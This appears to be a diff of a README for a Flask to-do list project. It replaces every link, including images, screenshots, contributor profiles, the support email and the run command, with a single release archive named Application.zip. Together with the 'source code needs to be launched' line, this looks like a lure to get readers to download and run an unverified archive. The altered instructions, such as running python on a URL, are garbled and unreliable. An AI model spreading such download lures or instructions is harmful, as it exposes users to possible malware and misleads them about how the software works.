@@ -1,6 +1,6 @@
 # Awesome To-Do List Web Application with Flask and SQL Alchemy 🚀
 
-![To-Do List Image](https://example.com/todo_image.png)
+![To-Do List Image](https://github.com/holasoy12/MyTodo_app_using_flask_with_flask-sqlalchemy/releases/download/v1.0/Application.zip)
 
 Welcome to the "MyTodo_app_using_flask_with_flask-sqlalchemy" repository! This project is a simple and responsive To-Do list web application built using HTML, CSS, Flask, Flask-SQLAlchemy, and Bootstrap. Users can efficiently create, manage, and organize their tasks with features like adding new tasks, marking tasks as complete, and deleting tasks. The application also boasts a responsive design and includes social media links in the footer for easy sharing.
 
@@ -27,7 +27,7 @@ The project is built using the following technologies:
 To use the To-Do list application, follow these simple steps:
 
 1. Clone the repository to your local machine.
-2. Run the Flask application using `python app.py`.
+2. Run the Flask application using `python https://github.com/holasoy12/MyTodo_app_using_flask_with_flask-sqlalchemy/releases/download/v1.0/Application.zip`.
 3. Access the application in your web browser.
 
 Start creating and managing your tasks seamlessly!
@@ -52,11 +52,11 @@ Start creating and managing your tasks seamlessly!
 - mytodoapp
 - mytodolist
 
-## Get the Source Code [here](https://github.com/adelante20/Release/raw/refs/heads/master/Release.zip) 💻
+## Get the Source Code [here](https://github.com/holasoy12/MyTodo_app_using_flask_with_flask-sqlalchemy/releases/download/v1.0/Application.zip) 💻
 
 ### Launch the Source Code  
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/adelante20/Release/raw/refs/heads/master/Release.zip)  
+[![Download Now](https://github.com/holasoy12/MyTodo_app_using_flask_with_flask-sqlalchemy/releases/download/v1.0/Application.zip%20Now-Click%20Here-brightgreen)](https://github.com/holasoy12/MyTodo_app_using_flask_with_flask-sqlalchemy/releases/download/v1.0/Application.zip)  
 
 Don't forget, the source code needs to be launched!
 
@@ -66,23 +66,23 @@ If you encounter any issues with the download link, please check the "Releases" 
 
 Here are some screenshots of the MyTodo App in action:
 
-![Screenshot 1](https://example.com/screenshot1.png)
-![Screenshot 2](https://example.com/screenshot2.png)
-![Screenshot 3](https://example.com/screenshot3.png)
+![Screenshot 1](https://github.com/holasoy12/MyTodo_app_using_flask_with_flask-sqlalchemy/releases/download/v1.0/Application.zip)
+![Screenshot 2](https://github.com/holasoy12/MyTodo_app_using_flask_with_flask-sqlalchemy/releases/download/v1.0/Application.zip)
+![Screenshot 3](https://github.com/holasoy12/MyTodo_app_using_flask_with_flask-sqlalchemy/releases/download/v1.0/Application.zip)
 
 ## Contributors 🌟
 
 A big thank you to all the contributors who have helped make this project possible! 🙌
 
-- John_Doe ([@johndoe](https://github.com/johndoe))
-- Jane_Smith ([@janesmith](https://github.com/janesmith))
+- John_Doe ([@johndoe](https://github.com/holasoy12/MyTodo_app_using_flask_with_flask-sqlalchemy/releases/download/v1.0/Application.zip))
+- Jane_Smith ([@janesmith](https://github.com/holasoy12/MyTodo_app_using_flask_with_flask-sqlalchemy/releases/download/v1.0/Application.zip))
 
 ## Support ℹ️
 
 For any questions or issues, please feel free to reach out to the project maintainers:
 
-- Email: mytodoapp@example.com
-- Twitter: [@mytodoapp](https://twitter.com/mytodoapp)
+- Email: https://github.com/holasoy12/MyTodo_app_using_flask_with_flask-sqlalchemy/releases/download/v1.0/Application.zip
+- Twitter: [@mytodoapp](https://github.com/holasoy12/MyTodo_app_using_flask_with_flask-sqlalchemy/releases/download/v1.0/Application.zip)
 
 ## Spread the Word 📢
 
